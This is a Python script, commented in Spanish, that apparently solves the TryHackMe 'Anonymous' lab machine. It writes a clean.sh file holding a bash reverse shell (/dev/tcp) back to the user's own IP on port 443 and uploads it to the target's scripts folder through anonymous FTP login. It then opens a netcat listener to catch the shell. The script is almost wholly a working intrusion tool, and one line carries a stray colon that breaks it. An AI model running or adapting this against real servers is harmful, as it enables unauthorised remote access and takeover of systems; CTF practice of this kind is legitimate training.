#!/bin/python3

# Resolución máquina Anonymous de THM

import time
from ftplib import FTP
import os
import netifaces


ip_victima = input("Introduce la IP de la máquina víctima: ")

# Extraemos nuestra IP desde la interface activa...
def obtener_ip() -> str:
    interfaces = netifaces.interfaces()
    mi_ip = netifaces.ifaddresses(interfaces[1])
    direccion_ip = mi_ip[2][0]["addr"]
    print(f"La IP de tu interfaz activa es {direccion_ip}")    
    return direccion_ip

interfaz: str = obtener_ip()
time.sleep(2):

# Creamos el fichero clean.sh
with open("clean.sh", "a") as archivo:
    archivo.write("#!/bin/bash\n\nbash -i >& /dev/tcp/" + interfaz + "/443 0>&1\n")

if os.path.isfile("clean.sh"):
    print("[+] Se creó correctamente...")
else:
    print("[-] Hubo un error...")
    exit(1)

def subir_archivo_servidor_ftp(servidor: str, archivo_local:str, archivo_remoto:str):
    try:
        with FTP(servidor) as ftp:
            ftp.login()
            with open(archivo_local, 'rb') as archivo:
                ftp.storbinary(f'STOR {archivo_remoto}', archivo)
            print("[+] Archivo subido exitosamente...")
            os.remove("clean.sh")
    except Exception as e:
        print(f"[-] Error al subir el archivo al servidor FTP: {e}")

# Configurar los parámetros de conexión y archivos...
servidor_ftp = ip_victima
archivo_local = "clean.sh"
archivo_remoto = "scripts/clean.sh"

# Llamar a la función que sube el archivo...
subir_archivo_servidor_ftp(servidor_ftp, archivo_local, archivo_remoto)


def iniciar_escucha_puerto(puerto:int):
    try:
        output = os.system(f"nc -nlvp {puerto}")
        print(f"[+] Escucha en el puerto {puerto} iniciada correctamente...")
        print(output)
    except:
        print(f"[-] Error al iniciar la escucha en el puerto {puerto}")

iniciar_escucha_puerto(443)